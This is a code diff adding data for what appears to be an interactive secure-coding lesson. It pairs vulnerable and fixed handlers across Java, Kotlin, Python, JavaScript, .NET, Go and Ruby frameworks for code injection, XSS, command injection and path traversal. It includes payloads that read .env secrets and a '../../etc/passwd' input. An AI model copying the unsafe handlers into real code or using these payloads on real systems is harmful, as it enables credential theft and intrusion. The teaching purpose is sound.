+        { kind: 'Ordinary', input: 'report.pdf',
+          unsafe: { op: 'Path becomes /srv/files/report.pdf', out: 'report.pdf downloaded', effect: 'ok' },
+          fixed: { op: 'The server’s list maps report.pdf → a91f.pdf', out: 'report.pdf downloaded', effect: 'ok' } },
+        { kind: 'Harmful', input: '../../etc/passwd',
+          unsafe: { op: 'Each ../ climbs up: path becomes /etc/passwd', out: 'The server’s /etc/passwd downloaded', effect: 'harm' },
+          fixed: { op: 'Not in the list; no path is built', out: '404 Not Found', effect: 'blocked' } }
+      ]
+    }
+  };
+
+  /* ---------- stacks: per module u/f = unsafe/fixed code, uh/fh = highlighted line (0-based) ---------- */
+  const L = (...lines) => lines.join('\n');
+  const STACKS = [
+    /* ===== Java ===== */
+    { id: 'springboot', group: 'Java', label: 'Spring Boot', lang: 'Java',
+      m94: { sink: 'SpEL parseExpression().getValue()', guard: 'a compiled Pattern', payload: "T(java.lang.Runtime).getRuntime().exec('cat .env')",
+        u: L('@GetMapping("/calc")', 'String calc(@RequestParam String expr) {          // "2 + 3"', '  return String.valueOf(parser.parseExpression(expr).getValue());   // SpEL', '}'), uh: 2,
+        f: L('static final Pattern SUM = Pattern.compile("^(\\\\d+) ([+*]) (\\\\d+)$");', '', '@GetMapping("/calc")', 'String calc(@RequestParam String expr) {', '  Matcher m = SUM.matcher(expr);', '  if (!m.matches()) throw new ResponseStatusException(HttpStatus.BAD_REQUEST);', '  long a = Long.parseLong(m.group(1)), b = Long.parseLong(m.group(3));', '  return String.valueOf(m.group(2).equals("+") ? a + b : a * b);', '}'), fh: 5 },
+      m79: { sink: 'Thymeleaf th:utext', guard: 'Thymeleaf th:text',
+        u: L('// controller: model.addAttribute("name", name);  // from @RequestParam', '<!-- hello.html -->', '<h1 th:utext="|Hi ${name}|">Hi</h1>'), uh: 2,
+        f: L('// controller: model.addAttribute("name", name);  // from @RequestParam', '<!-- hello.html -->', '<h1 th:text="|Hi ${name}|">Hi</h1>   <!-- escaped -->'), fh: 2 },
+      m78: { sink: 'Runtime.exec() through sh -c', guard: 'ProcessBuilder with an argument list',
+        u: L('@GetMapping("/ping")', 'String ping(@RequestParam String host) throws IOException {', '  Process p = Runtime.getRuntime().exec(new String[] { "sh", "-c", "ping -c 1 " + host });', '  return new String(p.getInputStream().readAllBytes());', '}'), uh: 2,
+        f: L('static final Set<String> HOSTS = Set.of("web-1", "web-2");', '', '@GetMapping("/ping")', 'String ping(@RequestParam String host) throws IOException {', '  if (!HOSTS.contains(host)) throw new ResponseStatusException(HttpStatus.BAD_REQUEST);', '  Process p = new ProcessBuilder("ping", "-c", "1", host).start();   // no shell', '  return new String(p.getInputStream().readAllBytes());', '}'), fh: 4 },
+      m22: { sink: 'Path.of() + FileSystemResource', guard: 'a server-owned Map',
+        u: L('@GetMapping("/file")', 'Resource file(@RequestParam String name) {', '  return new FileSystemResource(Path.of("/srv/files", name));', '}'), uh: 2,
+        f: L('static final Map<String, String> FILES = Map.of("report.pdf", "a91f.pdf");', '', '@GetMapping("/file")', 'Resource file(@RequestParam String name) {', '  String stored = FILES.get(name);', '  if (stored == null) throw new ResponseStatusException(HttpStatus.NOT_FOUND);', '  return new FileSystemResource(Path.of("/srv/files", stored));', '}'), fh: 4 } },
+
+    { id: 'spring', group: 'Java', label: 'Spring Framework (MVC + JSP)', lang: 'Java',
+      m94: { sink: 'SpEL parseExpression().getValue()', guard: 'a compiled Pattern', payload: "T(java.lang.Runtime).getRuntime().exec('cat .env')",
+        u: L('@RequestMapping("/calc") @ResponseBody', 'public String calc(HttpServletRequest req) {', '  Expression e = parser.parseExpression(req.getParameter("expr"));   // "2 + 3"', '  return String.valueOf(e.getValue());', '}'), uh: 2,
+        f: L('@RequestMapping("/calc") @ResponseBody', 'public String calc(HttpServletRequest req, HttpServletResponse res) throws IOException {', '  Matcher m = SUM.matcher(String.valueOf(req.getParameter("expr")));', '  if (!m.matches()) { res.sendError(400); return null; }', '  long a = Long.parseLong(m.group(1)), b = Long.parseLong(m.group(3));', '  return String.valueOf(m.group(2).equals("+") ? a + b : a * b);', '}'), fh: 3 },
+      m79: { sink: 'a raw ${param.name} in JSP', guard: '<c:out>',
+        u: L('<%-- hello.jsp --%>', '<h1>Hi ${param.name}</h1>'), uh: 1,
+        f: L('<%-- hello.jsp --%>', '<h1>Hi <c:out value="${param.name}"/></h1>'), fh: 1 },
+      m78: { sink: 'Runtime.exec() through sh -c', guard: 'ProcessBuilder with an argument list',
+        u: L('@RequestMapping("/ping") @ResponseBody', 'public String ping(HttpServletRequest req) throws IOException {', '  String host = req.getParameter("host");', '  Process p = Runtime.getRuntime().exec(new String[] { "sh", "-c", "ping -c 1 " + host });', '  return new String(p.getInputStream().readAllBytes());', '}'), uh: 3,
+        f: L('@RequestMapping("/ping") @ResponseBody', 'public String ping(HttpServletRequest req, HttpServletResponse res) throws IOException {', '  String host = req.getParameter("host");', '  if (!HOSTS.contains(host)) { res.sendError(400); return null; }', '  Process p = new ProcessBuilder("ping", "-c", "1", host).start();   // no shell', '  return new String(p.getInputStream().readAllBytes());', '}'), fh: 3 },
+      m22: { sink: 'new File() + Files.copy()', guard: 'a server-owned Map',
+        u: L('@RequestMapping("/file")', 'public void file(HttpServletRequest req, HttpServletResponse res) throws IOException {', '  File f = new File("/srv/files", req.getParameter("name"));', '  Files.copy(f.toPath(), res.getOutputStream());', '}'), uh: 2,
+        f: L('@RequestMapping("/file")', 'public void file(HttpServletRequest req, HttpServletResponse res) throws IOException {', '  String stored = FILES.get(req.getParameter("name"));', '  if (stored == null) { res.sendError(404); return; }', '  Files.copy(Path.of("/srv/files", stored), res.getOutputStream());', '}'), fh: 2 } },
+
+    /* ===== Kotlin ===== */
+    { id: 'ktor', group: 'Kotlin', label: 'Ktor', lang: 'Kotlin',
+      m94: { sink: 'the Kotlin script engine eval()', guard: 'a Regex', payload: 'java.io.File(".env").readText()',
+        u: L('get("/calc") {', '  val expr = call.parameters["expr"]!!          // "2 + 3"', '  val r = ScriptEngineManager().getEngineByExtension("kts").eval(expr)', '  call.respondText(r.toString())', '}'), uh: 2,
+        f: L('val SUM = Regex("""^(\\d+) ([+*]) (\\d+)$""")', '', 'get("/calc") {', '  val m = SUM.matchEntire(call.parameters["expr"].orEmpty())', '    ?: return@get call.respond(HttpStatusCode.BadRequest)', '  val (a, op, b) = m.destructured', '  call.respondText((if (op == "+") a.toLong() + b.toLong() else a.toLong() * b.toLong()).toString())', '}'), fh: 4 },
+      m79: { sink: 'respondText() as HTML', guard: 'kotlinx.html text (+)',
+        u: L('get("/hi") {', '  val name = call.parameters["name"]', '  call.respondText("<h1>Hi $name</h1>", ContentType.Text.Html)', '}'), uh: 2,
+        f: L('get("/hi") {', '  val name = call.parameters["name"].orEmpty()', '  call.respondHtml { body { h1 { +"Hi $name" } } }   // escaped', '}'), fh: 2 },
+      m78: { sink: 'ProcessBuilder("sh", "-c", …)', guard: 'ProcessBuilder with separate args',
+        u: L('get("/ping") {', '  val host = call.parameters["host"]', '  ProcessBuilder("sh", "-c", "ping -c 1 $host").start()', '}'), uh: 2,
+        f: L('get("/ping") {', '  val host = call.parameters["host"]', '  if (host !in HOSTS) return@get call.respond(HttpStatusCode.BadRequest)', '  ProcessBuilder("ping", "-c", "1", host).start()   // no shell', '}'), fh: 2 },
+      m22: { sink: 'File() + respondFile()', guard: 'a server-owned Map',
+        u: L('get("/file") {', '  call.respondFile(File("/srv/files", call.parameters["name"]!!))', '}'), uh: 1,
+        f: L('get("/file") {', '  val stored = FILES[call.parameters["name"]] ?: return@get call.respond(HttpStatusCode.NotFound)', '  call.respondFile(File("/srv/files", stored))', '}'), fh: 1 } },
+
+    /* ===== Python ===== */
+    { id: 'django', group: 'Python', label: 'Django', lang: 'Python',
+      m94: { sink: 'eval()', guard: 're.fullmatch()', payload: "__import__('os').popen('cat .env').read()",
+        u: L('def calc(request):', '    expr = request.GET["expr"]          # "2 + 3"', '    return HttpResponse(str(eval(expr)))'), uh: 2,
+        f: L('SUM = re.compile(r"(\\d+) ([+*]) (\\d+)")', '', 'def calc(request):', '    m = SUM.fullmatch(request.GET.get("expr", ""))', '    if not m:', '        return HttpResponseBadRequest()', '    a, op, b = int(m[1]), m[2], int(m[3])', '    return HttpResponse(str(a + b if op == "+" else a * b))'), fh: 3 },
+      m79: { sink: 'an f-string in HttpResponse', guard: 'format_html()',
+        u: L('def hello(request):', '    name = request.GET.get("name", "")', '    return HttpResponse(f"<h1>Hi {name}</h1>")'), uh: 2,
+        f: L('from django.utils.html import format_html', '', 'def hello(request):', '    name = request.GET.get("name", "")', '    return HttpResponse(format_html("<h1>Hi {}</h1>", name))'), fh: 4 },
+      m78: { sink: 'subprocess.run(shell=True)', guard: 'subprocess.run() with a list',
+        u: L('def ping(request):', '    host = request.GET["host"]', '    out = subprocess.run(f"ping -c 1 {host}", shell=True, capture_output=True)', '    return HttpResponse(out.stdout)'), uh: 2,
+        f: L('HOSTS = {"web-1", "web-2"}', '', 'def ping(request):', '    host = request.GET.get("host")', '    if host not in HOSTS:', '        return HttpResponseBadRequest()', '    out = subprocess.run(["ping", "-c", "1", host], capture_output=True)  # no shell', '    return HttpResponse(out.stdout)'), fh: 4 },
+      m22: { sink: 'os.path.join() + open()', guard: 'a server-owned dict',
+        u: L('def download(request):', '    path = os.path.join("/srv/files", request.GET["name"])', '    return FileResponse(open(path, "rb"))'), uh: 1,
+        f: L('FILES = {"report.pdf": "a91f.pdf"}   # set by the server', '', 'def download(request):', '    stored = FILES.get(request.GET.get("name"))', '    if stored is None:', '        raise Http404', '    return FileResponse(open(os.path.join("/srv/files", stored), "rb"))'), fh: 3 } },
+
+    { id: 'flask', group: 'Python', label: 'Flask', lang: 'Python',
+      m94: { sink: 'eval()', guard: 're.fullmatch()', payload: "__import__('os').popen('cat .env').read()",
+        u: L('@app.get("/calc")', 'def calc():', '    return str(eval(request.args["expr"]))   # "2 + 3"'), uh: 2,
+        f: L('@app.get("/calc")', 'def calc():', '    m = SUM.fullmatch(request.args.get("expr", ""))', '    if not m:', '        abort(400)', '    a, op, b = int(m[1]), m[2], int(m[3])', '    return str(a + b if op == "+" else a * b)'), fh: 2 },
+      m79: { sink: 'an f-string returned as HTML', guard: 'markupsafe.escape()',
+        u: L('@app.get("/hi")', 'def hi():', '    return f"<h1>Hi {request.args.get(\'name\', \'\')}</h1>"'), uh: 2,
+        f: L('from markupsafe import escape', '', '@app.get("/hi")', 'def hi():', '    return f"<h1>Hi {escape(request.args.get(\'name\', \'\'))}</h1>"'), fh: 4 },
+      m78: { sink: 'subprocess.run(shell=True)', guard: 'subprocess.run() with a list',
+        u: L('@app.get("/ping")', 'def ping():', '    host = request.args["host"]', '    return subprocess.run(f"ping -c 1 {host}", shell=True, capture_output=True).stdout'), uh: 3,
+        f: L('@app.get("/ping")', 'def ping():', '    host = request.args.get("host")', '    if host not in HOSTS:', '        abort(400)', '    return subprocess.run(["ping", "-c", "1", host], capture_output=True).stdout'), fh: 3 },
+      m22: { sink: 'os.path.join() + send_file()', guard: 'a server-owned dict',
+        u: L('@app.get("/file")', 'def file():', '    return send_file(os.path.join("/srv/files", request.args["name"]))'), uh: 2,
+        f: L('@app.get("/file")', 'def file():', '    stored = FILES.get(request.args.get("name"))', '    if stored is None:', '        abort(404)', '    return send_file(os.path.join("/srv/files", stored))'), fh: 2 } },
+
+    { id: 'fastapi', group: 'Python', label: 'FastAPI', lang: 'Python',
+      m94: { sink: 'eval()', guard: 're.fullmatch()', payload: "__import__('os').popen('cat .env').read()",
+        u: L('@app.get("/calc")', 'def calc(expr: str):                 # "2 + 3"', '    return {"result": eval(expr)}'), uh: 2,
+        f: L('@app.get("/calc")', 'def calc(expr: str):', '    m = SUM.fullmatch(expr)', '    if not m:', '        raise HTTPException(400)', '    a, op, b = int(m[1]), m[2], int(m[3])', '    return {"result": a + b if op == "+" else a * b}'), fh: 2 },
+      m79: { sink: 'an f-string in HTMLResponse', guard: 'html.escape()',
+        u: L('@app.get("/hi", response_class=HTMLResponse)', 'def hi(name: str = ""):', '    return f"<h1>Hi {name}</h1>"'), uh: 2,
+        f: L('@app.get("/hi", response_class=HTMLResponse)', 'def hi(name: str = ""):', '    return f"<h1>Hi {html.escape(name)}</h1>"'), fh: 2 },
+      m78: { sink: 'subprocess.run(shell=True)', guard: 'subprocess.run() with a list',
+        u: L('@app.get("/ping")', 'def ping(host: str):', '    return subprocess.run(f"ping -c 1 {host}", shell=True, capture_output=True).stdout'), uh: 2,
+        f: L('@app.get("/ping")', 'def ping(host: str):', '    if host not in HOSTS:', '        raise HTTPException(400)', '    return subprocess.run(["ping", "-c", "1", host], capture_output=True).stdout'), fh: 2 },
+      m22: { sink: 'os.path.join() + FileResponse', guard: 'a server-owned dict',
+        u: L('@app.get("/file")', 'def file(name: str):', '    return FileResponse(os.path.join("/srv/files", name))'), uh: 2,
+        f: L('@app.get("/file")', 'def file(name: str):', '    stored = FILES.get(name)', '    if stored is None:', '        raise HTTPException(404)', '    return FileResponse(os.path.join("/srv/files", stored))'), fh: 2 } },
+
+    /* ===== JavaScript / TypeScript ===== */
+    { id: 'express', group: 'JavaScript / TypeScript', label: 'Node.js + Express', lang: 'JavaScript',
+      m94: { sink: 'eval()', guard: 'a regex', payload: "require('fs').readFileSync('.env')",
+        u: L('const expr = req.query.expr;   // "2 + 3"', 'res.send(String(eval(expr)));'), uh: 1,
+        f: L('const m = /^(\\d+) ([+*]) (\\d+)$/.exec(req.query.expr);', 'if (!m) return res.sendStatus(400);', "const OPS = { '+': (a, b) => a + b, '*': (a, b) => a * b };", 'res.send(String(OPS[m[2]](Number(m[1]), Number(m[3]))));'), fh: 1 },
+      m79: { sink: 'res.send() with a raw string', guard: 'escapeHtml()',
+        u: L('const name = req.query.name;', "res.send('<h1>Hi ' + name + '</h1>');"), uh: 1,
+        f: L("const escapeHtml = require('escape-html');", 'const name = req.query.name;', "res.send('<h1>Hi ' + escapeHtml(name) + '</h1>');"), fh: 2 },
+      m78: { sink: 'exec()', guard: 'execFile()',
+        u: L('const host = req.query.host;   // "web-1"', "exec('ping -c 1 ' + host);"), uh: 1,
+        f: L("const HOSTS = new Set(['web-1', 'web-2']);", 'const host = req.query.host;', 'if (!HOSTS.has(host)) return res.sendStatus(400);', "execFile('ping', ['-c', '1', host]);   // no shell"), fh: 2 },
+      m22: { sink: 'path.join() + sendFile()', guard: 'a server-owned Map',
+        u: L("const file = path.join('/srv/files', req.query.name);", 'res.sendFile(file);'), uh: 0,
+        f: L("const FILES = new Map([['report.pdf', 'a91f.pdf']]);   // set by the server", 'const stored = FILES.get(req.query.name);', 'if (!stored) return res.sendStatus(404);', "res.sendFile(path.join('/srv/files', stored));"), fh: 1 } },
+
+    { id: 'nest', group: 'JavaScript / TypeScript', label: 'NestJS', lang: 'TypeScript',
+      m94: { sink: 'eval()', guard: 'a regex', payload: "require('fs').readFileSync('.env')",
+        u: L("@Get('calc')", "calc(@Query('expr') expr: string) {   // \"2 + 3\"", '  return String(eval(expr));', '}'), uh: 2,
+        f: L("@Get('calc')", "calc(@Query('expr') expr: string) {", '  const m = /^(\\d+) ([+*]) (\\d+)$/.exec(expr);', '  if (!m) throw new BadRequestException();', '  const [a, b] = [Number(m[1]), Number(m[3])];', "  return String(m[2] === '+' ? a + b : a * b);", '}'), fh: 3 },
+      m79: { sink: 'a template string returned as HTML', guard: 'escapeHtml()',
+        u: L("@Get('hi') @Header('Content-Type', 'text/html')", "hi(@Query('name') name: string) {", '  return `<h1>Hi ${name}</h1>`;', '}'), uh: 2,
+        f: L("@Get('hi') @Header('Content-Type', 'text/html')", "hi(@Query('name') name: string) {", '  return `<h1>Hi ${escapeHtml(name)}</h1>`;   // escape-html', '}'), fh: 2 },
+      m78: { sink: 'execSync()', guard: 'execFileSync()',
+        u: L("@Get('ping')", "ping(@Query('host') host: string) {", "  return execSync('ping -c 1 ' + host).toString();", '}'), uh: 2,
+        f: L("@Get('ping')", "ping(@Query('host') host: string) {", '  if (!HOSTS.has(host)) throw new BadRequestException();', "  return execFileSync('ping', ['-c', '1', host]).toString();   // no shell", '}'), fh: 2 },
+      m22: { sink: 'join() + res.sendFile()', guard: 'a server-owned Map',
+        u: L("@Get('file')", "file(@Query('name') name: string, @Res() res: Response) {", "  res.sendFile(join('/srv/files', name));", '}'), uh: 2,
+        f: L("@Get('file')", "file(@Query('name') name: string, @Res() res: Response) {", '  const stored = FILES.get(name);   // Map set by the server', '  if (!stored) throw new NotFoundException();', "  res.sendFile(join('/srv/files', stored));", '}'), fh: 2 } },
+
+    { id: 'next', group: 'JavaScript / TypeScript', label: 'Next.js (App Router)', lang: 'JavaScript',
+      m94: { sink: 'eval()', guard: 'a regex', payload: "require('fs').readFileSync('.env')",
+        u: L('// app/api/calc/route.js', 'export async function GET(req) {', "  const expr = req.nextUrl.searchParams.get('expr');   // \"2 + 3\"", '  return new Response(String(eval(expr)));', '}'), uh: 3,
+        f: L('// app/api/calc/route.js', 'export async function GET(req) {', "  const m = /^(\\d+) ([+*]) (\\d+)$/.exec(req.nextUrl.searchParams.get('expr') ?? '');", '  if (!m) return new Response(null, { status: 400 });', '  const [a, b] = [Number(m[1]), Number(m[3])];', "  return new Response(String(m[2] === '+' ? a + b : a * b));", '}'), fh: 2 },
+      m79: { sink: 'dangerouslySetInnerHTML', guard: 'a plain JSX text child',
+        u: L('export default async function Page({ searchParams }) {', '  const { name } = await searchParams;', "  return <h1 dangerouslySetInnerHTML={{ __html: 'Hi ' + name }} />;", '}'), uh: 2,
+        f: L('export default async function Page({ searchParams }) {', '  const { name } = await searchParams;', '  return <h1>Hi {name}</h1>;   // React escapes text', '}'), fh: 2 },
+      m78: { sink: 'execSync()', guard: 'execFileSync()',
+        u: L('export async function GET(req) {', "  const host = req.nextUrl.searchParams.get('host');", "  return new Response(execSync('ping -c 1 ' + host));", '}'), uh: 2,
+        f: L('export async function GET(req) {', "  const host = req.nextUrl.searchParams.get('host');", '  if (!HOSTS.has(host)) return new Response(null, { status: 400 });', "  return new Response(execFileSync('ping', ['-c', '1', host]));   // no shell", '}'), fh: 2 },
+      m22: { sink: 'path.join() + readFile()', guard: 'a server-owned Map',
+        u: L('export async function GET(req) {', "  const name = req.nextUrl.searchParams.get('name');", "  return new Response(await readFile(path.join('/srv/files', name)));", '}'), uh: 2,
+        f: L('export async function GET(req) {', "  const stored = FILES.get(req.nextUrl.searchParams.get('name'));", '  if (!stored) return new Response(null, { status: 404 });', "  return new Response(await readFile(path.join('/srv/files', stored)));", '}'), fh: 1 } },
+
+    { id: 'react', group: 'JavaScript / TypeScript', label: 'React', lang: 'JSX', client: 'express',
+      m79: { sink: 'dangerouslySetInnerHTML', guard: 'a plain JSX text child',
+        u: L('function Hello() {', "  const name = new URLSearchParams(location.search).get('name');", "  return <h1 dangerouslySetInnerHTML={{ __html: 'Hi ' + name }} />;", '}'), uh: 2,
+        f: L('function Hello() {', "  const name = new URLSearchParams(location.search).get('name');", '  return <h1>Hi {name}</h1>;   // React escapes text', '}'), fh: 2 } },
+
+    { id: 'vue', group: 'JavaScript / TypeScript', label: 'Vue', lang: 'Vue SFC', client: 'express',
+      m79: { sink: 'v-html', guard: '{{ }} interpolation',
+        u: L('<script setup>', "const name = new URLSearchParams(location.search).get('name')", '<\/script>', '<template><h1 v-html="\'Hi \' + name"></h1></template>'), uh: 3,
+        f: L('<script setup>', "const name = new URLSearchParams(location.search).get('name')", '<\/script>', '<template><h1>Hi {{ name }}</h1></template>   <!-- escaped -->'), fh: 3 } },
+
+    { id: 'angular', group: 'JavaScript / TypeScript', label: 'Angular', lang: 'TypeScript', client: 'express',
+      m79: { sink: 'bypassSecurityTrustHtml()', guard: '{{ }} interpolation',
+        u: L('// hello.component.ts', "html = this.sanitizer.bypassSecurityTrustHtml('Hi ' + this.route.snapshot.queryParamMap.get('name'));", '// hello.component.html', '<h1 [innerHTML]="html"></h1>'), uh: 1,
+        f: L('// hello.component.ts', "name = this.route.snapshot.queryParamMap.get('name');", '// hello.component.html', '<h1>Hi {{ name }}</h1>   <!-- escaped -->'), fh: 3 } },
+
+    { id: 'vanilla', group: 'JavaScript / TypeScript', label: 'Vanilla browser JS', lang: 'JavaScript', client: 'express',
+      m79: { sink: 'innerHTML', guard: 'textContent',
+        u: L("const name = params.get('name');", "hello.innerHTML = 'Hi ' + name;"), uh: 1,
+        f: L("const name = params.get('name');", "hello.textContent = 'Hi ' + name;"), fh: 1 } },
+
+    /* ===== .NET ===== */
+    { id: 'aspnetmvc', group: '.NET', label: 'ASP.NET Core MVC', lang: 'C#',
+      m94: { sink: 'CSharpScript.EvaluateAsync()', guard: 'a Regex', payload: 'System.IO.File.ReadAllText(".env")',
+        u: L('[HttpGet("calc")]', 'public async Task<string?> Calc(string expr)   // "2 + 3"', '{', '    var r = await CSharpScript.EvaluateAsync(expr);', '    return r?.ToString();', '}'), uh: 3,
+        f: L('static readonly Regex Sum = new(@"^(\\d+) ([+*]) (\\d+)$");', '', '[HttpGet("calc")]', 'public IActionResult Calc(string expr)', '{', '    var m = Sum.Match(expr ?? "");', '    if (!m.Success) return BadRequest();', '    long a = long.Parse(m.Groups[1].Value), b = long.Parse(m.Groups[3].Value);', '    return Content((m.Groups[2].Value == "+" ? a + b : a * b).ToString());', '}'), fh: 6 },
+      m79: { sink: '@Html.Raw()', guard: 'plain @Model.Name',
+        u: L('@* Hello.cshtml *@', '<h1>Hi @Html.Raw(Model.Name)</h1>'), uh: 1,
+        f: L('@* Hello.cshtml *@', '<h1>Hi @Model.Name</h1>   @* Razor encodes *@'), fh: 1 },
+      m78: { sink: 'Process.Start() through /bin/sh', guard: 'ProcessStartInfo.ArgumentList',
+        u: L('[HttpGet("ping")]', 'public IActionResult Ping(string host)', '{', '    Process.Start("/bin/sh", $"-c \\"ping -c 1 {host}\\"");', '    return Ok();', '}'), uh: 3,
+        f: L('[HttpGet("ping")]', 'public IActionResult Ping(string host)', '{', '    if (!Hosts.Contains(host)) return BadRequest();', '    Process.Start(new ProcessStartInfo("ping") { ArgumentList = { "-c", "1", host } });', '    return Ok();', '}'), fh: 3 },
+      m22: { sink: 'Path.Combine() + PhysicalFile()', guard: 'a server-owned Dictionary',
+        u: L('[HttpGet("file")]', 'public IActionResult Download(string name)', '{', '    return PhysicalFile(Path.Combine("/srv/files", name), "application/pdf");', '}'), uh: 3,
+        f: L('[HttpGet("file")]', 'public IActionResult Download(string name)', '{', '    if (!Files.TryGetValue(name ?? "", out var stored)) return NotFound();', '    return PhysicalFile(Path.Combine("/srv/files", stored), "application/pdf");', '}'), fh: 3 } },
+
+    { id: 'aspnetmin', group: '.NET', label: 'ASP.NET Core Minimal APIs', lang: 'C#',
+      m94: { sink: 'CSharpScript.EvaluateAsync()', guard: 'a Regex', payload: 'System.IO.File.ReadAllText(".env")',
+        u: L('app.MapGet("/calc", async (string expr) =>     // "2 + 3"', '    (await CSharpScript.EvaluateAsync(expr))?.ToString());'), uh: 1,
+        f: L('app.MapGet("/calc", (string expr) =>', '{', '    var m = Sum.Match(expr);', '    if (!m.Success) return Results.BadRequest();', '    long a = long.Parse(m.Groups[1].Value), b = long.Parse(m.Groups[3].Value);', '    return Results.Text((m.Groups[2].Value == "+" ? a + b : a * b).ToString());', '});'), fh: 3 },
+      m79: { sink: 'Results.Content() as HTML', guard: 'HtmlEncoder.Default.Encode()',
+        u: L('app.MapGet("/hi", (string name) =>', '    Results.Content($"<h1>Hi {name}</h1>", "text/html"));'), uh: 1,
+        f: L('app.MapGet("/hi", (string name) =>', '    Results.Content($"<h1>Hi {HtmlEncoder.Default.Encode(name)}</h1>", "text/html"));'), fh: 1 },
+      m78: { sink: 'Process.Start() through /bin/sh', guard: 'ProcessStartInfo.ArgumentList',
+        u: L('app.MapGet("/ping", (string host) =>', '{', '    Process.Start("/bin/sh", $"-c \\"ping -c 1 {host}\\"");', '    return Results.Ok();', '});'), uh: 2,
+        f: L('app.MapGet("/ping", (string host) =>', '{', '    if (!Hosts.Contains(host)) return Results.BadRequest();', '    Process.Start(new ProcessStartInfo("ping") { ArgumentList = { "-c", "1", host } });', '    return Results.Ok();', '});'), fh: 2 },
+      m22: { sink: 'Path.Combine() + Results.File()', guard: 'a server-owned Dictionary',
+        u: L('app.MapGet("/file", (string name) =>', '    Results.File(Path.Combine("/srv/files", name)));'), uh: 1,
+        f: L('app.MapGet("/file", (string name) =>', '    Files.TryGetValue(name, out var stored)', '        ? Results.File(Path.Combine("/srv/files", stored))', '        : Results.NotFound());'), fh: 1 } },
+
+    { id: 'blazor', group: '.NET', label: 'Blazor', lang: 'Razor', client: 'aspnetmin',
+      m79: { sink: 'a (MarkupString) cast', guard: 'plain @Name',
+        u: L('@page "/hello"', '<h1>@((MarkupString)("Hi " + Name))</h1>', '@code { [SupplyParameterFromQuery] public string? Name { get; set; } }'), uh: 1,
+        f: L('@page "/hello"', '<h1>Hi @Name</h1>   @* Blazor encodes *@', '@code { [SupplyParameterFromQuery] public string? Name { get; set; } }'), fh: 1 } },
+
+    /* ===== Go ===== */
+    { id: 'gohttp', group: 'Go', label: 'net/http', lang: 'Go',
+      m94: { sink: 'the yaegi interpreter’s Eval()', guard: 'a regexp', payload: 'os.ReadFile(".env")',
+        u: L('vm := interp.New(interp.Options{})', 'vm.Use(stdlib.Symbols)                        // standard library loaded', 'v, _ := vm.Eval(r.URL.Query().Get("expr"))    // "2 + 3"', 'fmt.Fprint(w, v)'), uh: 2,
+        f: L('var sum = regexp.MustCompile(`^(\\d+) ([+*]) (\\d+)$`)', '', 'm := sum.FindStringSubmatch(r.URL.Query().Get("expr"))', 'if m == nil { http.Error(w, "bad request", 400); return }', 'a, _ := strconv.Atoi(m[1]); b, _ := strconv.Atoi(m[3])', 'if m[2] == "+" { fmt.Fprint(w, a+b) } else { fmt.Fprint(w, a*b) }'), fh: 3 },
+      m79: { sink: 'fmt.Fprintf() into HTML', guard: 'html.EscapeString()',
+        u: L('name := r.URL.Query().Get("name")', 'fmt.Fprintf(w, "<h1>Hi %s</h1>", name)'), uh: 1,
+        f: L('name := r.URL.Query().Get("name")', 'fmt.Fprintf(w, "<h1>Hi %s</h1>", html.EscapeString(name))'), fh: 1 },
+      m78: { sink: 'exec.Command("sh", "-c", …)', guard: 'exec.Command() with separate args',
+        u: L('host := r.URL.Query().Get("host")', 'out, _ := exec.Command("sh", "-c", "ping -c 1 "+host).Output()', 'w.Write(out)'), uh: 1,
+        f: L('host := r.URL.Query().Get("host")', 'if !hosts[host] { http.Error(w, "bad request", 400); return }', 'out, _ := exec.Command("ping", "-c", "1", host).Output()   // no shell', 'w.Write(out)'), fh: 1 },
+      m22: { sink: 'filepath.Join() + ServeFile()', guard: 'a server-owned map',
+        u: L('name := r.URL.Query().Get("name")', 'http.ServeFile(w, r, filepath.Join("/srv/files", name))'), uh: 1,
+        f: L('stored, ok := files[r.URL.Query().Get("name")]   // map set by the server', 'if !ok { http.NotFound(w, r); return }', 'http.ServeFile(w, r, filepath.Join("/srv/files", stored))'), fh: 0 } },
+
+    { id: 'gin', group: 'Go', label: 'Gin', lang: 'Go',
+      m94: { sink: 'the yaegi interpreter’s Eval()', guard: 'a regexp', payload: 'os.ReadFile(".env")',
+        u: L('r.GET("/calc", func(c *gin.Context) {', '  v, _ := vm.Eval(c.Query("expr"))   // yaegi, stdlib loaded; "2 + 3"', '  c.String(200, "%v", v)', '})'), uh: 1,
+        f: L('r.GET("/calc", func(c *gin.Context) {', '  m := sum.FindStringSubmatch(c.Query("expr"))', '  if m == nil { c.AbortWithStatus(400); return }', '  a, _ := strconv.Atoi(m[1]); b, _ := strconv.Atoi(m[3])', '  if m[2] == "+" { c.String(200, "%d", a+b) } else { c.String(200, "%d", a*b) }', '})'), fh: 2 },
+      m79: { sink: 'c.Data() with raw HTML', guard: 'c.HTML() with html/template',
+        u: L('r.GET("/hi", func(c *gin.Context) {', '  c.Data(200, "text/html", []byte("<h1>Hi "+c.Query("name")+"</h1>"))', '})'), uh: 1,
+        f: L('r.GET("/hi", func(c *gin.Context) {', '  c.HTML(200, "hi.tmpl", gin.H{"name": c.Query("name")})   // html/template escapes', '})'), fh: 1 },
+      m78: { sink: 'exec.Command("sh", "-c", …)', guard: 'exec.Command() with separate args',
+        u: L('r.GET("/ping", func(c *gin.Context) {', '  out, _ := exec.Command("sh", "-c", "ping -c 1 "+c.Query("host")).Output()', '  c.Data(200, "text/plain", out)', '})'), uh: 1,
+        f: L('r.GET("/ping", func(c *gin.Context) {', '  host := c.Query("host")', '  if !hosts[host] { c.AbortWithStatus(400); return }', '  out, _ := exec.Command("ping", "-c", "1", host).Output()   // no shell', '  c.Data(200, "text/plain", out)', '})'), fh: 2 },
+      m22: { sink: 'filepath.Join() + c.File()', guard: 'a server-owned map',
+        u: L('r.GET("/file", func(c *gin.Context) {', '  c.File(filepath.Join("/srv/files", c.Query("name")))', '})'), uh: 1,
+        f: L('r.GET("/file", func(c *gin.Context) {', '  stored, ok := files[c.Query("name")]', '  if !ok { c.AbortWithStatus(404); return }', '  c.File(filepath.Join("/srv/files", stored))', '})'), fh: 1 } },
+
+    /* ===== Ruby ===== */
+    { id: 'rails', group: 'Ruby', label: 'Ruby on Rails', lang: 'Ruby',
+      m94: { sink: 'eval()', guard: 'an anchored Regexp (\\A…\\z)', payload: 'File.read(".env")',
+        u: L('def calc', '  render plain: eval(params[:expr]).to_s   # "2 + 3"', 'end'), uh: 1,
